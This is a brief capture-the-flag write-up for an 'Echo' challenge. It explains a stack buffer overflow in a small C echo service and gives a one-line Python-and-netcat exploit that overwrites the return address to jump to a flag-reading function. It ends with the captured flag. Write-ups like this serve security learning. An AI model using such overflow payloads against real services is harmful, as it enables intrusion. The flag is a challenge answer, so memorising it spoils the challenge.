# Echo
**Description:**  
Little Suzie started learning C. She created a simple program that echo's back whatever you input. Here is the binary file. The vampire came across this service on the internet. `nc hack.bckdr.in 8002`. Reports say he found a flag. See if you can get it.

*****

After connecting to the service, it's easy to determine that we're dealing with a simple buffer overflow.

Disassembling the binary using IDA, we can also find a function (address `0x0804854D`) that will read out the flag file.

All we have to do is overflow the buffer and overwrite the return address with the function's address, in order to get the flag.

Exploit string: `python -c 'print "a"*62 + "\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002`

FLAG: 96f674623c2c378f89700aa46f02cf3b311489f0facdfac6fd5885d4bc1a129a